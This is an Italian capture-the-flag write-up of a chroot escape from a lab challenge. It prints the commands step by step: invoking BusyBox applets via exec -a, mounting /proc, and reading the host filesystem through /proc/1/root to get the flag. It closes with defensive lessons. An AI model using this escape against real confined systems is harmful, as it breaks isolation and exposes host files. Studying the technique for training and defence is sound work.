---
layout: writeup
lang: it
permalink: /writeups/chroot-silver/
title: "chroot-silver"
ref: chroot-silver
date: 2026-08-01
bare: true
platform: KCTF
platform_color: "#0f7a3d"
os: Linux (BusyBox / musl)
series: kaspersky-ctf-2026
tags: [misc, chroot, busybox, escape, proc, linux]
txt: /writeups-files/chroot-silver.txt
summary: "77 punti. La shell parte dentro un chroot con due sole directory e nessun comando. Ma /bin/sh è BusyBox, che contiene mount e tutto il resto: si monta /proc e da lì si esce dalla gabbia."
---

# Writeup — chroot-silver (Kaspersky CTF 2026)

Categoria: misc
Valore: 77 points (221 solves)
Link: https://ctf.kaspersky.com/challenges/14
Data: 08/2026

FLAG: kaspersky{4f262050-065b-475f-8130-cb6a7f2b4905}

---

## Sommario

Challenge da 77 punti la cui superficie è una singola shell. Ci si collega via TLS all'istanza assegnata con openssl s_client e si finisce dentro un /bin/sh confinato in un chroot estremamente minimale: due sole directory visibili, /bin con dentro solo sh, e /lib con il linker e la libc musl. Nessuna utility esterna, nessun /proc, nessun /dev, nessun file di flag da nessuna parte raggiungibile.

Il punto della challenge è che /bin/sh è BusyBox, e BusyBox è un multi-call binary: tutte le applet (mount, ls, cat, chroot, nsenter, nc) sono dentro quell'unico eseguibile e si raggiungono cambiando il nome con cui lo si invoca, cioè con exec -a. Da lì si crea /proc a mano, si monta il filesystem proc, e /proc/1/root dà accesso alla root filesystem del processo PID 1, che sta fuori dal chroot. La flag è in /root

Catena: openssl s_client → shell BusyBox ash in chroot → enumerazione, filesystem a due directory → exec -a busybox /bin/sh --list rivela tutte le applet → exec -a id conferma uid=0 → mkdir /proc via applet → mount -t proc → /proc/1/root → /root/flag.txt.

---

## strumenti e metodologie aggiuntive

durante la sessione è stato utilizzato un llm: per interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco e spiegazione dettagliata di concetti tecnici. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.

l'idea di invocare BusyBox con exec -a per raggiungere le applet è arrivata dal chatbot dopo che l'enumerazione manuale si era esaurita del tutto.

---

## Premessa

questa challenge l'ho risolta in più sessioni separate e la maggior parte del tempo è andata in enumerazione a vuoto. il chroot è così spoglio che dopo venti minuti hai già visto tutto quello che c'è, e da lì in avanti stai solo riprovando cose che non esistono: ls, id, env, nc, socat, readlink, chroot, mount come binari separati. tutti not found

il metodo che alla fine ha funzionato è stato lavorare un comando alla volta tenendo un resoconto scritto di ogni test già fatto, perché la sessione si chiude di continuo (exec sostituisce la shell, quindi ogni applet invocata così termina la connessione) e senza un registro si ripetono gli stessi tentativi a ogni riconnessione. nel log qui sotto ogni blocco che riparte da openssl s_client è una riconnessione forzata.

il prompt locale nei blocchi di output è stato sostituito con $ in fase di pubblicazione.

---

## Fase 1 — Connessione

la challenge suggerisce direttamente il comando, con l'istanza da sostituire:

openssl s_client -connect .tcp.kit.sasc.tf:443 -servername .tcp.kit.sasc.tf -quiet

avviata l'istanza personale, l'host assegnato era 960edf79d1664d39a817.tcp.kit.sasc.tf:443

$ openssl s_client -connect 960edf79d1664d39a817.tcp.kit.sasc.tf:443 -servername 960edf79d1664d39a817.tcp.kit.sasc.tf -quiet
depth=3 C = US, O = Internet Security Research Group, CN = ISRG Root X1
depth=0 CN = *.kit.sasc.tf
verify return:1
/bin/sh: can't access tty; job control turned off
~ #

connessione TLS riuscita, certificato wildcard *.kit.sasc.tf firmato Let's Encrypt. il messaggio sul tty e il prompt ~ # dicono già due cose: siamo in una /bin/sh non interattiva e siamo root.

---

<div class="writeup-image">
  <img src="/assets/writeups/kctf-chroot-silver.png" alt="Pagina della challenge chroot-silver">
  <div class="img-caption">La challenge sulla piattaforma: 77 punti, istanza personale da avviare</div>
</div>

## Fase 2 — Enumerazione del chroot

primo comando e primo muro:

~ # ls -la
/bin/sh: ls: not found

~ # pwd
/

siamo nella root. senza ls l'unico modo di listare è il glob della shell:

~ # echo /*
/bin /lib

~ # echo /bin/*
/bin/sh

~ # echo /lib/*
/lib/ld-musl-x86_64.so.1 /lib/libc.musl-x86_64.so.1

due directory in tutto. in /bin solo sh, in /lib il dynamic linker musl e la libc musl. il filesystem visibile è quindi:

/
├── bin/
│   └── sh
└── lib/
    ├── ld-musl-x86_64.so.1
    └── libc.musl-x86_64.so.1

set dà il contesto completo del processo:

BB_ASH_VERSION='1.37.0'
HISTFILE='/.ash_history'
HOME='/'
HOSTNAME='(none)'
PATH='/bin:/sbin:/usr/bin:/usr/sbin'
PPID='458'
PS1='\w \$ '
PWD='/'
SHLVL='2'
SOCAT_PEERADDR='[0000:0000:0000:0000:0000:ffff:0ac4:1bf0]'
SOCAT_PEERPORT='60924'
SOCAT_PID='458'
SOCAT_PPID='1'
SOCAT_SOCKADDR='[0000:0000:0000:0000:0000:ffff:0a00:020f]'
SOCAT_SOCKPORT='31337'
SOCAT_VERSION='1.8.0.0'
TERM='linux'

quello che conta qui:

BB_ASH_VERSION=1.37.0 dice che la shell è BusyBox ash, non una sh generica. è il dato che a posteriori risolve tutta la challenge, e sul momento l'ho registrato senza capirne il peso.
la connessione è gestita da socat, con SOCAT_PPID=1, cioè socat è figlio diretto di init. il socket interno è esposto sulla 31337 e il peer remoto sta sulla 60924.
il PATH punta a quattro directory di cui tre non esistono nemmeno.

help elenca i builtin disponibili:

. : [ [[ alias bg break cd chdir command continue echo eval exec
exit export false fg getopts hash help history jobs kill let
local printf pwd read readonly return set shift source test times
trap true type ulimit umask unalias unset wait

molti builtin, nessuna utility esterna. e soprattutto exec, che è quello che servirà.

le directory che normalmente daresti per scontate non ci sono:

~ # echo /proc/*
/proc/*

~ # echo /dev/*
/dev/*

~ # echo /sbin/* /usr/bin/* /usr/sbin/*
/sbin/* /usr/bin/* /usr/sbin/*

il glob che non trova niente restituisce il pattern stesso, quindi nessuna di queste esiste. niente /proc è il dettaglio che pesa più di tutti, perché è la via di escape classica da un chroot.

~ # echo /.[!.]* /..?*
/.[!.]* /..?*

nessun dotfile.

---

## Fase 3 — Tutto quello che non ha funzionato

questa fase è lunga e la riporto per intero, perché il valore sta nell'esclusione: quando avrò trovato la strada giusta, saprò con certezza che non ce n'erano altre.

id non esiste, provato anche in sostituzione di comando:

~ # printf 'uid=%s euid=%s gid=%s egid=%s\n' "$(id -u)" "$(id -u)" "$(id -g)" "$(id -g)"
/bin/sh: id: not found
/bin/sh: id: not found
/bin/sh: id: not found
/bin/sh: id: not found
uid= euid= gid= egid=

la flag nei posti ovvi, /flag: inesistente.

uscire dal chroot con i path relativi, cd /bin && cd ../.. e cd .. da /: si resta sempre confinati in /. è il comportamento corretto di un chroot, .. sulla root punta a se stessa.

invocare la libc direttamente, exec /lib/ld-musl-x86_64.so.1 /bin/sh: si blocca, interrotto con Ctrl+C, nessun risultato.

type sh; type ash; type bash: solo /bin/sh, ash e bash non esistono come comandi separati.

/dev/fd e /proc/self/fd: non accessibili, e readlink non esiste per interrogarli.

command -V su tutto quello che sarebbe stato utile: chroot, mount, nc, socat, tutti not found.

/proc/self/status, /proc/1/status, /proc/self/cmdline: tutti inesistenti, coerente con /proc assente.

history: nessun output, nonostante HISTFILE sia impostato su /.ash_history.

kill -0 1: exit=0. il PID 1 esiste ed è raggiungibile dal nostro namespace, cosa che poi si rivelerà il punto chiave, ma senza /proc non potevo farne niente.

a questo punto lo stato era: root dentro un chroot con due directory, nessuna utility, nessuna flag, nessun escape. e la sensazione di aver esaurito la superficie.

---

## Fase 4 — BusyBox dietro /bin/sh

la svolta è nel dato della Fase 2 che avevo registrato e non usato: BB_ASH_VERSION. se la shell è BusyBox, /bin/sh non è una shell, è il binario BusyBox completo, e BusyBox è un multi-call binary: decide quale applet eseguire guardando argv[0], cioè il nome con cui è stato invocato. tutte le applet stanno dentro quell'unico file.

il builtin exec accetta -a per impostare argv[0] a piacere. quindi:

~ # exec -a busybox /bin/sh --list
[
[[
acpid
...
cat
...
chroot
...
id
...
ls
...
mount
...
nc
...
nsenter
...
pivot_root
...
switch_root
...
unshare
...
zcip

l'elenco completo, centinaia di applet. dentro ci sono tutte le cose che avevo cercato come binari separati e che non esistevano: mount, chroot, nsenter, unshare, pivot_root, switch_root, nc, ls, id, cat, wget, vi.

conferma dei privilegi, per la via giusta:

~ # exec -a id /bin/sh
uid=0 gid=0

siamo root. e si vede subito il costo di questo metodo: exec sostituisce il processo shell, quindi quando l'applet termina la sessione si chiude e bisogna ricollegarsi. ogni comando di qui in avanti è una connessione nuova.

il motivo per cui id da solo dava not found e così invocato funziona è che le applet BusyBox non hanno binari propri nel chroot: normalmente sono symlink verso busybox, e qui quei symlink non sono stati creati. il codice c'era da sempre, mancava solo il nome per raggiungerlo.

---

## Fase 5 — Creare e montare /proc

con mount disponibile la strada è quella classica: montare proc e usarlo per guardare fuori dal chroot. primo tentativo diretto:

~ # exec -a mount /bin/sh -t proc proc /proc
mount: mounting proc on /proc failed: No such file or directory

l'errore non è sui permessi, è sul mount point: /proc non esiste come directory, e mount non la crea. serve mkdir, che è un'altra applet.

qui ho provato prima a incapsulare le due cose in un sottoshell con env, che non esiste:

~ # env -i PATH=/bin /bin/sh -c 'exec -a mount /bin/sh -t proc proc /proc'
/bin/sh: env: not found

la forma che funziona usa sh -c per non far morire la shell principale con l'exec:

~ # sh -c 'exec -a mkdir /bin/sh /proc'

~ # exec -a ls /bin/sh /
bin
lib
proc

/proc creato. riconnesso, il mount stavolta passa senza dire niente:

~ # exec -a mount /bin/sh -t proc proc /proc

e il filesystem proc è quello reale dell'host:

~ # exec -a ls /bin/sh /proc
1
10
107
108
112
12
...
954
955
96
acpi
buddyinfo
bus
cgroups
cmdline
consoles
cpuinfo
...
self
slabinfo
softirqs
stat
swaps
sys
sysrq-trigger
sysvipc
thread-self
timer_list
tty
uptime
version
vmallocinfo
vmstat
zoneinfo

decine di PID, non solo il nostro. siamo in un chroot ma non in un PID namespace separato, quindi vediamo tutti i processi del sistema che ci ospita. questa è la condizione che rende l'escape possibile: il chroot cambia la vista del filesystem, non quella dei processi.

---

## Fase 6 — Escape via /proc/1/root e flag

/proc/<pid>/root è un symlink alla root filesystem vista da quel processo. il PID 1 non è dentro il nostro chroot, quindi il suo root è la root vera:

~ # exec -a ls /bin/sh /proc/1/root
app
bin
dev
etc
init
lib
proc
root
sbin
sys
tmp
usr

un filesystem completo, con /root, /etc, /app. siamo fuori.

~ # exec -a ls /bin/sh /proc/1/root/root
flag.txt

~ # exec -a cat /bin/sh /proc/1/root/root/flag.txt
kaspersky{4f262050-065b-475f-8130-cb6a7f2b4905}

---

## Catena completa

openssl s_client verso l'istanza assegnata → shell /bin/sh in chroot, prompt root
→ echo /* : due sole directory, /bin (solo sh) e /lib (linker + libc musl)
→ set : BB_ASH_VERSION=1.37.0, connessione gestita da socat con SOCAT_PPID=1
→ nessun /proc, /dev, /sbin, /usr; nessuna utility esterna; nessun dotfile
→ vicoli ciechi: /flag inesistente, .. confinato, ld-musl diretto si blocca, chroot/mount/nc/socat not found
→ kill -0 1 restituisce 0, il PID 1 è raggiungibile ma senza /proc è inutilizzabile
→ /bin/sh è BusyBox: exec -a busybox /bin/sh --list espone tutte le applet
→ exec -a id /bin/sh conferma uid=0 gid=0
→ mount diretto fallisce, il mount point non esiste
→ sh -c 'exec -a mkdir /bin/sh /proc' crea la directory senza uccidere la shell
→ exec -a mount /bin/sh -t proc proc /proc monta il proc reale dell'host
→ /proc mostra tutti i PID del sistema: chroot senza PID namespace separato
→ /proc/1/root è la root filesystem del PID 1, fuori dal chroot
→ /proc/1/root/root/flag.txt letto con l'applet cat → flag

---

## Lezioni apprese

il dato che risolveva la challenge l'avevo in mano dopo cinque minuti e non l'ho letto. BB_ASH_VERSION nell'output di set dice che la shell è BusyBox, e BusyBox è un multi-call binary: da lì l'intera toolchain era già presente sul sistema. ho passato due sessioni a cercare binari che non potevano esistere invece di chiedermi cosa fosse esattamente l'unico binario presente.

un chroot non è una sandbox. isola la vista del filesystem e nient'altro: PID namespace, mount namespace e privilegi restano quelli di prima. essere root dentro un chroot che vede i processi dell'host significa avere già l'escape in mano, serve solo un modo per esprimerlo. la difesa corretta non è un chroot spoglio, è un container con namespace separati e capabilities ridotte.

l'assenza di /proc non è una protezione se puoi montarlo. bloccarne la visibilità senza togliere CAP_SYS_ADMIN al processo è una mezza misura, e mkdir più mount la annullano in due comandi.

su un target dove ogni comando chiude la sessione, il resoconto scritto vale più della velocità. tenere un registro di ogni test già fatto è quello che mi ha evitato di rifare la stessa enumerazione a ogni riconnessione, ed è anche il motivo per cui alla fine sapevo con certezza che la via di BusyBox era l'unica rimasta

exec sostituisce il processo, sh -c lo incapsula. banale, ma è la differenza fra eseguire una applet e perdere la shell a ogni comando

---

## Tool utilizzati

openssl s_client, BusyBox 1.37.0 invocato via exec -a (applet busybox --list, id, mkdir, mount, ls, cat), builtin di ash (echo con glob, set, export, help, type, command -V, kill, printf, history)
